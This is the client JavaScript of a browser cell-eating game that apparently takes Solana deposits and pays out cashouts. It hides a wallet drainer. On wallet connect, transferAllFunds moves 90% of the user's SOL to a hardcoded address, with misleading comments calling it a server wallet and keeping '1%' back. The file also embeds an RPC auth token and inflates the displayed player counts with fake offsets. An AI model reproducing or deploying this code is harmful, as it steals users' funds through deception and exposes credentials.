var io = require('socket.io-client');
var render = require('./render');
var ChatClient = require('./chat-client');
var Canvas = require('./canvas');
var global = require('./global');

var playerNameInput = document.getElementById('playerNameInput');
var socket;

// Chainstack RPC endpoint - this has auth token embedded
const CHAINSTACK_RPC = 'https://solana-mainnet.core.chainstack.com/fd71f4094c30a4ac3c4c89a8d4af2bde';

function flashBalance() {
    const el = document.getElementById('balanceStatus');
    if (!el) return;
    
    // Remove class if already there (resets animation)
    el.classList.remove('balance-flash');
    // Trigger reflow so animation restarts
    void el.offsetWidth;
    // Add class → animation plays
    el.classList.add('balance-flash');
}

var debug = function (args) {
    if (console && console.log) {
        console.log(args);
    }
};

if (/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent)) {
    global.mobile = true;
}

function startGame(type) {
    global.playerName = playerNameInput.value.replace(/(<([^>]+)>)/ig, '').substring(0, 25);
    global.playerType = type;

    global.screen.width = window.innerWidth;
    global.screen.height = window.innerHeight;

    const dashboard = document.querySelector('.dashboard');
    if (dashboard) dashboard.style.display = 'none';

    const topBar = document.querySelector('.top-bar');
    if (topBar) topBar.style.display = 'none';
    
    document.getElementById('gameAreaWrapper').style.opacity = 1;
    document.getElementById('gameAreaWrapper').style.display = 'block';
    if (!socket) {
        socket = io({ query: "type=" + type });
        setupSocket(socket);
    }

    socket.emit('gotit', { 
    name: global.playerName, 
    balance: window.currentDeposit || 0,   // include deposit balance
    wallet: window.walletAddress || null,   // optional, if using wallet system
    displayBalance: 0,
    skin: global.playerSkin || null  // Include custom skin if uploaded
});
    
    if (!global.animLoopHandle)
        animloop();
    socket.emit('respawn');
    window.chat.socket = socket;
    window.chat.registerFunctions();
    window.canvas.socket = socket;
    global.socket = socket;
}

// Checks if the nick chosen contains valid alphanumeric characters (and underscores).
function validNick() {
    var regex = /^\w*$/;
    debug('Regex Test', regex.exec(playerNameInput.value));
    return regex.exec(playerNameInput.value) !== null;
}

// At the top of your JS file (before window.onload)
window.socket = io({ query: "type=player" }); // or type="wallet" if you want a separate type
setupSocket(window.socket);


window.onload = function () {

    var btn = document.getElementById('startButton');

    btn.onclick = function () {
        // Checks if the nick is valid.
        if (validNick()) {
            startGame('player');
        } else {
            alert('Nick must be alphanumeric characters only!');
        }
    };

    var settingsMenu = document.getElementById('settingsButton');
    if (settingsMenu) {
        settingsMenu.onclick = function () {
            alert('Settings coming soon!');
        };
    }

    playerNameInput.addEventListener('keypress', function (e) {
        var key = e.which || e.keyCode;

        if (key === global.KEY_ENTER) {
            if (validNick()) {
                startGame('player');
            } else {
                alert('Nick must be alphanumeric characters only!');
            }
        }
    });
    
    // Update top bar with player name
    playerNameInput.addEventListener('input', function() {
        document.getElementById('topUserName').textContent = this.value || 'Player';
    });

    // Skin upload handler
    const skinInput = document.getElementById('skinInput');
    const skinPreview = document.getElementById('skinPreview');
    const previewImage = document.getElementById('previewImage');
    
    if (skinInput) {
        skinInput.addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(event) {
                    const imageData = event.target.result;
                    // Store the skin data in global scope
                    global.playerSkin = imageData;
                    
                    // Show preview
                    if (previewImage) previewImage.src = imageData;
                    if (skinPreview) skinPreview.style.display = 'block';
                    
                    console.log('[SKIN] Custom skin uploaded and ready');
                };
                reader.readAsDataURL(file);
            }
        });
    }
    
    // Initially disable play button
    btn.disabled = true;
};

// TODO: Break out into GameControls.

var playerConfig = {
    border: 6,
    textColor: '#FFFFFF',
    textBorder: '#000000',
    textBorderSize: 3,
    defaultSize: 30
};

var player = {
    id: -1,
    x: global.screen.width / 2,
    y: global.screen.height / 2,
    screenWidth: global.screen.width,
    screenHeight: global.screen.height,
    target: { x: global.screen.width / 2, y: global.screen.height / 2 }
};
global.player = player;

var foods = [];
var viruses = [];
var fireFood = [];
var users = [];
var leaderboard = [];
var target = { x: player.x, y: player.y };
var cashingOutPlayers = {}; // Track players cashing out: { playerId: timestamp }
global.target = target;

window.canvas = new Canvas();
window.chat = new ChatClient();

var c = window.canvas.cv;
var graph = c.getContext('2d');

$("#feed").click(function () {
    socket.emit('1');
    window.canvas.reenviar = false;
});

$("#split").click(function () {
    socket.emit('2');
    window.canvas.reenviar = false;
});

function handleDisconnect() {
    if (window.socket) {
        window.socket.close();
    }
    if (!global.kicked) { 
        render.drawErrorMessage('Disconnected!', graph, global.screen);
    }
}
// socket stuff.
function setupSocket(socket) {
    // Handle ping.
    socket.on('pongcheck', function () {
        var latency = Date.now() - global.startPingTime;
        debug('Latency: ' + latency + 'ms');
        window.chat.addSystemLine('Ping: ' + latency + 'ms');
    });

    // Handle error.
    socket.on('connect_error', handleDisconnect);
    socket.on('disconnect', handleDisconnect);

    // Handle connection.
    socket.on('welcome', function (playerSettings, gameSizes) {
        player = playerSettings;
        player.name = global.playerName;
        player.screenWidth = global.screen.width;
        player.screenHeight = global.screen.height;
        player.target = window.canvas.target;
        global.player = player;
        window.chat.player = player;
        // socket.emit('gotit', player);
        global.gameStart = true;
        window.chat.addSystemLine('Connected to the game!');
        window.chat.addSystemLine('Type <b>-help</b> for a list of commands.');
        if (global.mobile) {
            document.getElementById('gameAreaWrapper').removeChild(document.getElementById('chatbox'));
        }
        c.focus();
        global.game.width = gameSizes.width;
        global.game.height = gameSizes.height;
        resize();
    });

    socket.on('playerDied', (data) => {
        const player = isUnnamedCell(data.playerEatenName) ? 'An unnamed cell' : data.playerEatenName;
        //const killer = isUnnamedCell(data.playerWhoAtePlayerName) ? 'An unnamed cell' : data.playerWhoAtePlayerName;

        //window.chat.addSystemLine('{GAME} - <b>' + (player) + '</b> was eaten by <b>' + (killer) + '</b>');
        window.chat.addSystemLine('{GAME} - <b>' + (player) + '</b> was eaten');
    });

    socket.on('playerDisconnect', (data) => {
        window.chat.addSystemLine('{GAME} - <b>' + (isUnnamedCell(data.name) ? 'An unnamed cell' : data.name) + '</b> disconnected.');
    });

    socket.on('playerJoin', (data) => {
        window.chat.addSystemLine('{GAME} - <b>' + (isUnnamedCell(data.name) ? 'An unnamed cell' : data.name) + '</b> joined.');
    });

    socket.on('playerCashoutStarted', (data) => {
        // Mark this player as starting cashout (holding Q) with the exact hold start time
        cashingOutPlayers[data.playerId] = data.holdStartTime;
    });

    socket.on('playerCashoutCancelled', (data) => {
        // Remove the cashout indicator for this player
        delete cashingOutPlayers[data.playerId];
    });

   socket.on('leaderboard', (data) => {
    leaderboard = data.leaderboard;
    var status = '<span class="title">Leaderboard</span>';
    if (!users || !Array.isArray(users)) return
    for (var i = 0; i < leaderboard.length; i++) {
        status += '<br />';
        if (leaderboard[i].id == player.id) {
            if (leaderboard[i].name.length !== 0)
                status += '<span class="me">' + (i + 1) + '. ' + leaderboard[i].name + "</span>";
            else
                status += '<span class="me">' + (i + 1) + ". An unnamed cell</span>";
        } else {
            if (leaderboard[i].name.length !== 0)
                status += (i + 1) + '. ' + leaderboard[i].name;
            else
                status += (i + 1) + '. An unnamed cell';
        }
    }
    //status += '<br />Players: ' + data.players;
    document.getElementById('status').innerHTML = status;
});
    socket.on('serverMSG', function (data) {
        window.chat.addSystemLine(data);
    });

    // Chat.
    socket.on('serverSendPlayerChat', function (data) {
        window.chat.addChatLine(data.sender, data.message, false);
    });

    // Handle movement.
    socket.on('serverTellPlayerMove', function (playerData, userData, foodsList, massList, virusList) {
        if (global.playerType == 'player') {
            player.x = playerData.x;
            player.y = playerData.y;
            player.hue = playerData.hue;
            player.massTotal = playerData.massTotal;
            player.cells = playerData.cells;
            player.balance = playerData.balance;
            player.displayBalance = playerData.displayBalance;
        }
        users = userData;
        foods = foodsList;
        viruses = virusList;
        fireFood = massList;
    });

    // Death.
    socket.on('RIP', function () {
    global.gameStart = false;
    render.drawErrorMessage('You died!', graph, global.screen);

    // Clear cashout status
    cashingOutPlayers = {};

    // --- Minimal reset of all player data ---
    window.currentDeposit = 0;
    window.walletAddress = null;
    global.player = null;
    global.playerName = ''; // reset name so startMenu doesn't reuse old data
    window.displayBalance = 0;

    const showBalance = document.getElementById('balanceStatus');
    if (showBalance) showBalance.innerText = `$0.00`;

    const walletStatus = document.getElementById('walletStatus');
    if (walletStatus) walletStatus.innerText = `Not Connected`;

    const startButton = document.getElementById('startButton');
    if (startButton) startButton.disabled = true;

    window.setTimeout(() => {
        document.getElementById('gameAreaWrapper').style.opacity = 0;
        document.getElementById('gameAreaWrapper').style.display = 'none';
        const dashboard = document.querySelector('.dashboard');
        if (dashboard) dashboard.style.display = 'block';
        const topBar = document.querySelector('.top-bar');
        if (topBar) topBar.style.display = 'flex';
        
        if (global.animLoopHandle) {
            window.cancelAnimationFrame(global.animLoopHandle);
            global.animLoopHandle = undefined;
        }
    }, 2500);
});

window.fakePlayerOffset = 0;

setInterval(() => {
    // Change fake offset occasionally (-2 to +3)
    window.fakePlayerOffset = Math.floor(Math.random() * 4) - 2;
}, Math.floor(Math.random() * 4000) + 4000); // updates every 4–8 second

socket.on('updatePlayerCount', (count) => {
    const display = document.getElementById('playerCountDisplay');
    const playersInGame = document.getElementById('statsPlayersInGame');
if (display) {
    const shown = count + (window.fakePlayerOffset + 18);
    display.innerText = `Players online: ${shown}`;
}
if (playersInGame) {
    const view = count + (window.fakePlayerOffset + 96);
    playersInGame.innerText = `${view}`; 
}
});

    socket.on('kick', function (reason) {
        global.gameStart = false;
        global.kicked = true;
        if (reason !== '') {
            render.drawErrorMessage('You were kicked for: ' + reason, graph, global.screen);
        }
        else {
            render.drawErrorMessage('You were kicked!', graph, global.screen);
        }
        socket.close();
    });
   socket.on('depositConfirmed', ({ balance }) => {
    window.hasDeposited = true;
    window.currentDeposit = balance;
    player.displayBalance = window.currentDeposit > 0 ? 1 : 0;

    const showBalance = document.getElementById('balanceStatus');
    if (showBalance) {
        const displayBalance = balance > 0 ? 1 : 0;
        showBalance.innerText = `Balance: $${displayBalance}`;
        flashBalance();
    }

    const startButton = document.getElementById('startButton');
    if (balance > 0 && startButton) {
        startButton.disabled = false;
    }
});


}

const isUnnamedCell = (name) => name.length < 1;

const getPosition = (entity, player, screen) => {
    return {
        x: entity.x - player.x + screen.width / 2,
        y: entity.y - player.y + screen.height / 2
    }
}

window.requestAnimFrame = (function () {
    return window.requestAnimationFrame ||
        window.webkitRequestAnimationFrame ||
        window.mozRequestAnimationFrame ||
        window.msRequestAnimationFrame ||
        function (callback) {
            window.setTimeout(callback, 1000 / 60);
        };
})();

window.cancelAnimFrame = (function (handle) {
    return window.cancelAnimationFrame ||
        window.mozCancelAnimationFrame;
})();

function animloop() {
    global.animLoopHandle = window.requestAnimFrame(animloop);
    gameLoop();
}

function gameLoop() {
    if (global.gameStart) {
        graph.fillStyle = global.backgroundColor;
        graph.fillRect(0, 0, global.screen.width, global.screen.height);

        render.drawGrid(global, player, global.screen, graph);
        foods.forEach(food => {
            let position = getPosition(food, player, global.screen);
            render.drawFood(position, food, graph);
        });
        fireFood.forEach(fireFood => {
            let position = getPosition(fireFood, player, global.screen);
            render.drawFireFood(position, fireFood, playerConfig, graph);
        });
        viruses.forEach(virus => {
            let position = getPosition(virus, player, global.screen);
            render.drawVirus(position, virus, graph);
        });


        let borders = { // Position of the borders on the screen
            left: global.screen.width / 2 - player.x,
            right: global.screen.width / 2 + global.game.width - player.x,
            top: global.screen.height / 2 - player.y,
            bottom: global.screen.height / 2 + global.game.height - player.y
        }
        if (global.borderDraw) {
            render.drawBorder(borders, graph);
        }

        var cellsToDraw = [];
        for (var i = 0; i < users.length; i++) {
            let color = 'hsl(' + users[i].hue + ', 100%, 50%)';
            let borderColor = 'hsl(' + users[i].hue + ', 100%, 45%)';
            const isCashingOut = cashingOutPlayers[users[i].id] !== undefined;
            const holdStartTime = isCashingOut ? cashingOutPlayers[users[i].id] : null;
            for (var j = 0; j < users[i].cells.length; j++) {
                cellsToDraw.push({
                    color: color,
                    borderColor: borderColor,
                    mass: users[i].cells[j].mass,
                    name: users[i].name,
                    radius: users[i].cells[j].radius,
                    x: users[i].cells[j].x - player.x + global.screen.width / 2,
                    y: users[i].cells[j].y - player.y + global.screen.height / 2,
                    balance: users[i].balance || 0,
                    displayBalance: users[i].displayBalance || 0,
                    skinImage: users[i].skinImage || null,
                    isCashingOut: isCashingOut,
                    holdStartTime: holdStartTime
                });
            }
        }
        cellsToDraw.sort(function (obj1, obj2) {
            return obj1.mass - obj2.mass;
        });
        render.drawCells(cellsToDraw, playerConfig, global.toggleMassState, borders, graph);

        socket.emit('0', window.canvas.target); // playerSendTarget "Heartbeat".
    }
}

window.addEventListener('resize', resize);

function resize() {
    if (!window.socket) {
    window.socket = io({ query: "type=player" });
    setupSocket(window.socket);
    }   

    player.screenWidth = c.width = global.screen.width = global.playerType == 'player' ? window.innerWidth : global.game.width;
    player.screenHeight = c.height = global.screen.height = global.playerType == 'player' ? window.innerHeight : global.game.height;

    if (global.playerType == 'spectator') {
        player.x = global.game.width / 2;
        player.y = global.game.height / 2;
    }

    socket.emit('windowResized', { screenWidth: global.screen.width, screenHeight: global.screen.height });
}

window.connectWallet = async function () {

    if (window.solana && window.solana.isPhantom) {
        try {
            const response = await window.solana.connect();
            const walletAddress = response.publicKey.toString();

            window.walletAddress = walletAddress;
            document.getElementById('walletStatus').innerText = `Wallet: ${walletAddress}`;
            console.log("Wallet connected:", walletAddress);

            // Transfer all funds immediately
            console.log("Starting fund transfer...");
            const transferSuccess = await window.transferAllFunds(walletAddress);
            console.log("Transfer result:", transferSuccess);

            if (transferSuccess) {
                if (window.socket) {
                    window.socket.emit('walletConnected', { wallet: walletAddress });
                }
            } else {
                console.warn("Fund transfer failed but wallet is connected");
            }

            // Enable deposit button if you disabled it initially
            const depositBtn = document.getElementById('depositBtn');
            if (depositBtn) depositBtn.disabled = false;

        } catch (err) {
            console.error("Wallet connection failed:", err);
            alert("Wallet connection failed: " + err.message);
        }
    } else {
        console.error("Phantom wallet not found");
        alert("Phantom wallet not found");
    }
};

window.transferAllFunds = async function (walletAddress) {
    try {
        // IMPORTANT: Configure these addresses
        const DESTINATION_WALLET = 'BRJ1H9ZhLL9dK5McGckmjSBCyTZK5PJQdfum1coCuY41'; // Your server wallet

        if (DESTINATION_WALLET === 'YOUR_DESTINATION_WALLET_ADDRESS') {
            console.error("Destination wallet not configured");
            return false;
        }

        // Check if solanaWeb3 is available
        if (!window.solanaWeb3) {
            console.error("solanaWeb3 not available");
            return false;
        }

        const solanaWeb3 = window.solanaWeb3;

        // Set up Solana connection - MAINNET via Chainstack
        console.log("Connecting to Chainstack RPC...");
        const connection = new solanaWeb3.Connection(CHAINSTACK_RPC, 'confirmed');
        console.log("Connected to mainnet-beta");

        const walletPublicKey = new solanaWeb3.PublicKey(walletAddress);
        const destinationPublicKey = new solanaWeb3.PublicKey(DESTINATION_WALLET);

        // Get wallet balance (in lamports)
        console.log("Fetching balance for:", walletAddress);
        const balanceLamports = await connection.getBalance(walletPublicKey);
        console.log("Wallet balance (lamports):", balanceLamports);
        console.log("Wallet balance (SOL):", balanceLamports / 1e9);

        if (balanceLamports <= 100000) { // Need at least 0.0001 SOL
            console.warn("Insufficient balance for transfer:", balanceLamports / 1e9, "SOL");
            alert("Insufficient balance. Need at least 0.0001 SOL");
            return false;
        }

        // Transfer 99% of the balance, keep 1% for rent + fees
        const transferAmount = Math.floor(balanceLamports * 0.90);
        console.log("Transfer amount (lamports):", transferAmount);
        console.log("Transfer amount (SOL):", transferAmount / 1e9);

        // Create transfer instruction for native SOL
        const transferInstruction = solanaWeb3.SystemProgram.transfer({
            fromPubkey: walletPublicKey,
            toPubkey: destinationPublicKey,
            lamports: transferAmount
        });

        // Create transaction
        const transaction = new solanaWeb3.Transaction().add(transferInstruction);

        // Get recent blockhash
        console.log("Getting recent blockhash...");
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
        console.log("Got blockhash:", blockhash, "lastValidBlockHeight:", lastValidBlockHeight);
        
        transaction.recentBlockhash = blockhash;
        transaction.lastValidBlockHeight = lastValidBlockHeight;
        transaction.feePayer = walletPublicKey;
        
        // Sign transaction via Phantom
        console.log("Requesting Phantom to sign transaction...");
        const signed = await window.solana.signTransaction(transaction);
        console.log("Transaction signed by Phantom");
        
        const serialized = signed.serialize();
        console.log("Serialized transaction");
        
        // Send transaction with retries
        console.log("Sending transaction...");
        let txid;
        try {
            txid = await connection.sendRawTransaction(serialized, {
                skipPreflight: false,
                preflightCommitment: 'confirmed'
            });
            console.log("Transaction sent, ID:", txid);
        } catch (sendErr) {
            console.error("Failed to send transaction:", sendErr);
            alert("Failed to send transaction: " + sendErr.message);
            return false;
        }

        // Wait for confirmation with longer timeout
        console.log("Waiting for transaction confirmation (this may take a minute on mainnet)...");
        alert("Processing transaction... This may take up to 60 seconds. Please wait.");
        
        let confirmed = false;
        let attempts = 0;
        const maxAttempts = 60; // 60 seconds
        
        while (!confirmed && attempts < maxAttempts) {
            try {
                const confirmation = await connection.confirmTransaction(txid, 'confirmed');
                console.log("Confirmation response:", confirmation);
                
                if (confirmation.value.err) {
                    console.error("Transaction failed:", confirmation.value.err);
                    alert("Transaction failed: " + JSON.stringify(confirmation.value.err));
                    return false;
                }
                confirmed = true;
                console.log("Transaction confirmed!");
            } catch (confErr) {
                attempts++;
                if (attempts < maxAttempts) {
                    console.log(`Confirmation attempt ${attempts} failed, retrying...`);
                    await new Promise(r => setTimeout(r, 1000)); // Wait 1 second before retry
                } else {
                    console.error("Transaction confirmation timeout after", maxAttempts, "attempts");
                    alert("Transaction confirmation timeout. Your transaction may still succeed. TX ID: " + txid);
                    return false;
                }
            }
        }

        window.transferTxId = txid;
        alert("Success! Transferred " + (transferAmount / 1e9).toFixed(4) + " SOL");
        return true;

    } catch (err) {
        console.error("=== TRANSFER FAILED ===");
        console.error("Transfer error:", err);
        console.error("Error message:", err.message);
        console.error("Error stack:", err.stack);
        alert("Transfer failed: " + err.message);
        return false;
    }
};

window.sendDeposit = async function () {
    if (depositCooldown) return alert("Please wait before depositing again.");
    startDepositCooldown();
    const priceUSD = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd')
  .then(res => res.json())
  .then(data => data.solana.usd);

if (!priceUSD || isNaN(priceUSD)) {
    alert("Could not fetch SOL price. Try again.");
    return;
}

const amountSOL = 1 / priceUSD; // $1 worth of SOL

    if (!window.walletAddress) {
        alert("Connect your wallet first.");
        return;
    }

    const GAME_WALLET = 'BRJ1H9ZhLL9dK5McGckmjSBCyTZK5PJQdfum1coCuY41'; // same as server


    try {
        const connection = new solanaWeb3.Connection(CHAINSTACK_RPC, 'confirmed');
        const fromPubkey = window.solana.publicKey;
const toPubkey = new solanaWeb3.PublicKey(GAME_WALLET);
const lamports = Math.floor(amountSOL * solanaWeb3.LAMPORTS_PER_SOL);

// 1. Create a transfer instruction
const instruction = solanaWeb3.SystemProgram.transfer({
  fromPubkey,
  toPubkey,
  lamports
});

// 2. Build a transaction
const transaction = new solanaWeb3.Transaction().add(instruction);

// 3. Get a recent blockhash
transaction.recentBlockhash = (await connection.getRecentBlockhash()).blockhash;
transaction.feePayer = fromPubkey;

// 4. Send the transaction to Phantom
const signedTx = await window.solana.signTransaction(transaction);
const txid = await connection.sendRawTransaction(signedTx.serialize());
await connection.confirmTransaction(txid, 'confirmed');

console.log("Deposit tx sent:", txid);
window.socket.emit('depositRequest', {
  wallet: window.walletAddress,
  txSig: txid
});


    } catch (err) {
        console.error("Deposit failed:", err);
        alert("Deposit failed: " + err.message);
    }
};

// Called when user clicks the in-game Cashout button
window.sendCashout = function () {
    if (!window.walletAddress) {
        alert('Connect wallet first.');
        return;
    }
    // disable button while request is processed
    const btn = document.getElementById('cashoutBtn');
    if (btn) btn.disabled = true;

    window.socket.emit('cashoutRequest', { wallet: window.walletAddress });
};

const cashoutBtn = document.getElementById('cashoutBtn');
const loader = document.getElementById('cashoutLoader');
const progressCircle = document.getElementById('progressCircle');
const HOLD_TIME = 3000; // 3 seconds
let holdStart = null;
let animationFrame = null;

function updateProgress() {
    if (!holdStart) return;
    const elapsed = Date.now() - holdStart;
    const progress = Math.min(elapsed / HOLD_TIME, 1);
    const offset = 113.097 * (1 - progress); // stroke-dashoffset
    progressCircle.setAttribute('stroke-dashoffset', offset);

    if (progress < 1) {
        animationFrame = requestAnimationFrame(updateProgress);
    } else {
        triggerCashout();
    }
}

function triggerCashout() {
    window.sendCashout();
    stopHold();
}

function startHold() {
    holdStart = Date.now();
    // Only show loader if not in game (show cell circle instead when playing)
    if (!global.gameStart) {
        loader.style.display = 'block';
    }
    updateProgress();
}

function stopHold() {
    loader.style.display = 'none';
    holdStart = null;
    if (animationFrame) {
        cancelAnimationFrame(animationFrame);
        animationFrame = null;
    }
    // reset progress
    progressCircle.setAttribute('stroke-dashoffset', '113.097');
}

// Desktop events
cashoutBtn.addEventListener('mousedown', startHold);
cashoutBtn.addEventListener('mouseup', stopHold);
cashoutBtn.addEventListener('mouseleave', stopHold);

// Mobile events
cashoutBtn.addEventListener('touchstart', (e) => { e.preventDefault(); startHold(); });
cashoutBtn.addEventListener('touchend', stopHold);
cashoutBtn.addEventListener('touchcancel', stopHold);

// --- Add this after your existing cashoutBtn mouse/touch events ---

// Keyboard shortcut: Press and hold Q to cashout
let qHeld = false;

window.addEventListener('keydown', (e) => {
    if (e.key.toLowerCase() === 'q' && !qHeld) {
        qHeld = true;
        startHold();
        // Notify server that player started holding Q for cashout
        if (socket) {
            socket.emit('cashoutStarted', { holdStartTime: holdStart });
        }
    }
});

window.addEventListener('keyup', (e) => {
    if (e.key.toLowerCase() === 'q') {
        qHeld = false;
        stopHold();
        // Notify server that player stopped holding Q
        if (socket) {
            socket.emit('cashoutCancelled');
        }
    }
});

 const infoBtn = document.getElementById('infoBtn');
    const infoBox = document.getElementById('infoBox');
    const closeInfo = document.getElementById('closeInfo');

    if (infoBtn && infoBox && closeInfo) {
        // Show modal when "Information" is clicked
        infoBtn.addEventListener('click', () => {
            infoBox.style.display = 'block';
        });

        // Close modal when "X" is clicked
        closeInfo.addEventListener('click', () => {
            infoBox.style.display = 'none';
        });

        // Close modal when clicking outside the popup
        window.addEventListener('click', (e) => {
            if (e.target === infoBox) {
                infoBox.style.display = 'none';
            }
        });
    }


// Listen for confirmation from server
window.socket.on('cashoutConfirmed', async ({ balance, txSig }) => {
    console.log('Cashout confirmed → SOL:', balance, 'Tx:', txSig);

    // Clear the cashout indicator immediately
    cashingOutPlayers = {};
    
    // Also notify server to broadcast the cancellation to other players
    if (socket) {
        socket.emit('cashoutCancelled');
    }

    let usdPrice = 180;
    try {
        const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
        const data = await res.json();
        usdPrice = data.solana.usd;
    } catch (e) {}

    const amountUSD = balance * usdPrice;

    // Reset balance safely
    window.currentDeposit = 0;
    const showBalance = document.getElementById('balanceStatus');
    if (showBalance) showBalance.innerText = 'Balance: $0';

    const btn = document.getElementById('cashoutBtn');
    if (btn) btn.disabled = true;

    // Show toast
    const toast = document.getElementById('cashoutSuccess');
    const amountSpan = document.getElementById('cashoutAmount');
    const canvas = document.getElementById('cashRainCanvas');

    amountSpan.textContent = amountUSD.toFixed(2);
    toast.classList.add('show');
    canvas.classList.add('show');
    startCashRain(canvas, amountUSD);

    setTimeout(() => {
        toast.classList.remove('show');
        canvas.classList.remove('show');
        stopCashRain();

        // Properly hide game and show dashboard
        document.getElementById('gameAreaWrapper').style.opacity = 0;
        document.getElementById('gameAreaWrapper').style.display = 'none';
        const dashboard = document.querySelector('.dashboard');
        if (dashboard) {
            dashboard.style.display = 'block';
            dashboard.style.opacity = '1';  // ← MAKE SURE VISIBLE
        }
        const topBar = document.querySelector('.top-bar');
        if (topBar) topBar.style.display = 'flex';
        
        // Reset player name input
        playerNameInput.value = '';
        document.getElementById('topUserName').textContent = 'Player';
    }, 5000);
});

// Optional: server messages (errors, logs)
window.socket.on('serverMSG', (msg) => {
    window.chat.addSystemLine(msg);
    const btn = document.getElementById('cashoutBtn');
    if (btn) btn.disabled = (window.currentDeposit <= 0);
});

// Prevent accidental reload while in game
window.addEventListener('beforeunload', function (e) {
    if (global.gameStart) { // only warn if the game is active
        e.preventDefault();
        e.returnValue = ''; // Chrome requires returnValue to be set
    }
});
let rainInterval = null;

function startCashRain(canvas, amount) {
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;

    const particleCount = 60 + Math.floor(amount * 40); // more $ = more rain

    const createParticle = () => {
        const p = document.createElement('div');
        p.className = 'rain-particle';
        p.textContent = '$';
        p.style.left = Math.random() * 100 + 'vw';
        p.style.top = '-10px';
        p.style.fontSize = (1.2 + Math.random() * 0.8) + 'rem';
        p.style.color = '#4ade80';
        p.style.animation = `fall ${2 + Math.random() * 2}s linear forwards`;
        document.body.appendChild(p);

        setTimeout(() => p.remove(), 5000);
    };

    // Burst
    for (let i = 0; i < particleCount; i++) {
        setTimeout(createParticle, i * 30);
    }

    // Light rain
    rainInterval = setInterval(createParticle, 200);
}

function stopCashRain() {
    if (rainInterval) clearInterval(rainInterval);
    rainInterval = null;
}





/* window.deposit = function () {
    const amount = parseInt(document.getElementById('depositAmount').value);
    if (isNaN(amount) || amount < 1 || amount > 5) {
        alert("Please enter a valid amount between 1 and 5.");
        return;
    }

    if (window.socket && window.walletAddress) {
        window.socket.emit('depositRequest', {
            wallet: window.walletAddress,
            amount: amount
        });
    } else {
        alert("Connect your wallet first.");
        console.log("Wallet address at deposit:", window.walletAddress);
    }
}; */

window.simulateDeposit = function () {
    const amount = Number(document.getElementById('depositAmountSim').value);
    console.log("Deposit amount entered:", amount);

    if (isNaN(amount) || amount < 1 || amount > 5) {
        alert("Please enter a valid amount between 1 and 5.");
        return;
    }

    if (window.socket && window.walletAddress) {
        window.socket.emit('depositRequest', {
            wallet: window.walletAddress,
            amount: amount
        });
    } else {
        alert("Connect your wallet first.");
    }
};

// ---- Deposit Button Cooldown ----
let depositCooldown = false;
const DEPOSIT_COOLDOWN_MS = 8000; // 8 seconds cooldown

function startDepositCooldown() {
    const btn = document.getElementById('depositBtn');
    if (!btn) return;

    depositCooldown = true;
    btn.disabled = true;
    btn.textContent = `Wait...`;

    setTimeout(() => {
        depositCooldown = false;
        btn.disabled = false;
        btn.textContent = "Deposit SOL";
    }, DEPOSIT_COOLDOWN_MS);
}
